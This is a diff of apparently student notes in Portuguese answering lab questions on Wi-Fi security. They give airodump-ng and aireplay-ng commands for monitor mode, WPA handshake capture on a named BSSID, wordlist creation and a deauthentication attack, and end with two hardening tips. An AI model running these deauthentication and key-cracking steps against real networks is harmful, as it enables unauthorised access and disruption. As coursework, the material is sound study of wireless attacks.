@@ -4,8 +4,9 @@ Questão 1.1:
 *Criar interface monitor: 
 	$sudo iw dev wls2 add mon0 type monitor 
 *$sudo airodump-ng mon0
-	~ desconecta internet do celular
+	-desconecta internet do celular
 * $sudo airodump-ng –bssid 00:21:8D:25:1D:09 mon0 -w meuarquivo
+	-conectar internet no celular, para tentar capturar as '4 Key message' - handshake
 *Criar arquivo com possíveis senhas: 
 	$sudo nano meuarquivodesenha.psk
 *Abrir meuarquivo.cap no wireshark para ver se o handshake foi capturado (key 01 de 04…)
@@ -30,4 +31,6 @@ up airodump-ng (placa) aireplay-ng -a MAC mon0 -0 0 (Se der erro use o --ignore-
 CTRL+C para o ataque.
 
 Questão 1.4:
-modificar o nome do computador para dificultar que a pessoa reconheça sua maquina com facilidade ao utilizar os comandos
+01) modificar o nome do computador para dificultar que reconheçam sua maquina com facilidade 
+02) utilizar uma "senha forte"
+
